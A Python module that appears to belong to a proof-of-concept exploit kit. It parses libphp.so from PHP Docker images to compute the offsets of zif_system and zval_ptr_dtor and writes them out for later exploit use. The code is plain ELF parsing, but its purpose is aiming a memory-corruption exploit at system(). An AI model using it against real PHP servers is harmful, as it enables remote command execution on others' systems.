"""Read ``zif_system`` / ``zval_ptr_dtor`` offsets from libphp.so.

The official PHP images are built by the Docker PHP maintainers; their libphp
layout differs from hand-built labs. Offsets are derived from the ELF symbol
table, so they are independent of ASLR and can be recomputed for any image.
"""

from __future__ import annotations

import hashlib
import os
import struct
import subprocess
import tempfile
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, Optional, Tuple

LIBPHP_PATH = "/usr/lib/apache2/modules/libphp.so"
SHT_SYMTAB = 2
SHT_DYNSYM = 11
PT_LOAD = 1


class OffsetsError(RuntimeError):
    """libphp.so could not be read or parsed."""


@dataclass(frozen=True)
class LibphpOffsets:
    zif_system: int
    zval_ptr_dtor: int
    sha256: str = ""
    container: str = ""


def _read_u32(data: bytes, offset: int) -> int:
    return struct.unpack_from("<I", data, offset)[0]


def _read_u64(data: bytes, offset: int) -> int:
    return struct.unpack_from("<Q", data, offset)[0]


def parse_libphp_bytes(data: bytes) -> Tuple[int, Dict[str, int]]:
    """Return ``(load_bias, {symbol: st_value})`` for the two target symbols."""
    if len(data) < 64 or data[:4] != b"\x7fELF":
        raise OffsetsError("not an ELF file")
    if data[4] != 2 or data[5] != 1:
        raise OffsetsError("libphp.so is not a little-endian ELF64 file")

    e_phoff = _read_u64(data, 0x20)
    e_shoff = _read_u64(data, 0x28)
    e_phentsize, e_phnum = struct.unpack_from("<HH", data, 0x36)
    e_shentsize, e_shnum = struct.unpack_from("<HH", data, 0x3A)
    if e_phentsize < 56 or e_shentsize < 64:
        raise OffsetsError("unexpected ELF table entry size")
    if e_phoff + e_phnum * e_phentsize > len(data):
        raise OffsetsError("program header table out of bounds")
    if e_shoff + e_shnum * e_shentsize > len(data):
        raise OffsetsError("section header table out of bounds")

    loads = []
    for index in range(e_phnum):
        base = e_phoff + index * e_phentsize
        if _read_u32(data, base) != PT_LOAD:
            continue
        vaddr = _read_u64(data, base + 16)
        memsz = _read_u64(data, base + 40)
        if memsz:
            loads.append(vaddr)
    if not loads:
        raise OffsetsError("no PT_LOAD segment")
    bias = min(loads)

    sections = []
    for index in range(e_shnum):
        base = e_shoff + index * e_shentsize
        sections.append(
            {
                "type": _read_u32(data, base + 4),
                "offset": _read_u64(data, base + 24),
                "size": _read_u64(data, base + 32),
                "link": _read_u32(data, base + 40),
                "entsize": _read_u64(data, base + 56),
            }
        )

    wanted = ("zif_system", "zval_ptr_dtor")
    found: Dict[str, int] = {}
    for section in sections:
        if section["type"] not in (SHT_SYMTAB, SHT_DYNSYM):
            continue
        if section["link"] >= len(sections):
            continue
        strtab = sections[section["link"]]
        strtab_start = strtab["offset"]
        strtab_end = strtab_start + strtab["size"]
        if strtab_end > len(data):
            continue
        sym_start = section["offset"]
        sym_end = sym_start + section["size"]
        if sym_end > len(data):
            continue
        entsize = section["entsize"] or 24
        if entsize < 24:
            continue
        for index in range(section["size"] // entsize):
            base = sym_start + index * entsize
            st_name = _read_u32(data, base)
            if st_name == 0:
                continue
            st_value = _read_u64(data, base + 8)
            name_offset = strtab_start + st_name
            if name_offset >= strtab_end:
                continue
            end = data.find(b"\x00", name_offset, strtab_end)
            if end < 0:
                continue
            try:
                name = data[name_offset:end].decode("ascii")
            except UnicodeDecodeError:
                continue
            if name in wanted and name not in found:
                found[name] = st_value

    missing = [name for name in wanted if name not in found]
    if missing:
        raise OffsetsError("symbols not found in libphp.so: " + ", ".join(missing))
    return bias, found


def parse_libphp(path: Path) -> LibphpOffsets:
    try:
        data = Path(path).read_bytes()
    except OSError as exc:
        raise OffsetsError("cannot read {}: {}".format(path, exc)) from exc
    bias, symbols = parse_libphp_bytes(data)
    zif = symbols["zif_system"] - bias
    dtor = symbols["zval_ptr_dtor"] - bias
    for name, value in (("zif_system", zif), ("zval_ptr_dtor", dtor)):
        if value <= 0 or value >= len(data):
            raise OffsetsError(
                "implausible {} offset 0x{:x} for {} bytes".format(name, value, len(data))
            )
    return LibphpOffsets(
        zif_system=zif,
        zval_ptr_dtor=dtor,
        sha256=hashlib.sha256(data).hexdigest(),
    )


def _docker_cp(container: str, source: str, destination: Path, docker: str) -> None:
    command = [docker, "cp", "{}:{}".format(container, source), str(destination)]
    try:
        result = subprocess.run(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=120,
        )
    except FileNotFoundError as exc:
        raise OffsetsError("docker not found in PATH") from exc
    except subprocess.SubprocessError as exc:
        raise OffsetsError("docker cp failed: {}".format(exc)) from exc
    if result.returncode != 0:
        message = result.stderr.decode("utf-8", "replace").strip()
        raise OffsetsError(
            "cannot copy {} from container {!r}: {}".format(source, container, message)
        )


def from_container(
    container: str,
    lib_path: str = LIBPHP_PATH,
    docker: str = "docker",
) -> LibphpOffsets:
    """Copy libphp.so out of a running container and parse its symbols."""
    handle, temp_name = tempfile.mkstemp(prefix="libphp-", suffix=".so")
    os.close(handle)
    temp_path = Path(temp_name)
    try:
        _docker_cp(container, lib_path, temp_path, docker)
        offsets = parse_libphp(temp_path)
        return LibphpOffsets(
            zif_system=offsets.zif_system,
            zval_ptr_dtor=offsets.zval_ptr_dtor,
            sha256=offsets.sha256,
            container=container,
        )
    finally:
        try:
            temp_path.unlink()
        except OSError:
            pass


def write_env(path: Path, offsets: LibphpOffsets) -> None:
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    lines = [
        "# generated by poc.offsets -- do not edit by hand",
        "ZIF_OFFSET=0x{:x}".format(offsets.zif_system),
        "DTOR_OFFSET=0x{:x}".format(offsets.zval_ptr_dtor),
    ]
    if offsets.sha256:
        lines.append("LIBPHP_SHA256={}".format(offsets.sha256))
    if offsets.container:
        lines.append("LIBPHP_CONTAINER={}".format(offsets.container))
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def read_env(path: Optional[Path]) -> Dict[str, str]:
    values: Dict[str, str] = {}
    if not path:
        return values
    try:
        lines = Path(path).read_text(encoding="utf-8").splitlines()
    except OSError:
        return values
    for raw in lines:
        line = raw.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, value = line.split("=", 1)
        values[key.strip()] = value.strip()
    return values


def offsets_from_env(path: Optional[Path]) -> Optional[LibphpOffsets]:
    values = read_env(path)
    if "ZIF_OFFSET" not in values or "DTOR_OFFSET" not in values:
        return None
    try:
        zif = int(values["ZIF_OFFSET"], 0)
        dtor = int(values["DTOR_OFFSET"], 0)
    except ValueError as exc:
        raise OffsetsError("invalid offsets file {}".format(path)) from exc
    return LibphpOffsets(
        zif_system=zif,
        zval_ptr_dtor=dtor,
        sha256=values.get("LIBPHP_SHA256", ""),
        container=values.get("LIBPHP_CONTAINER", ""),
    )
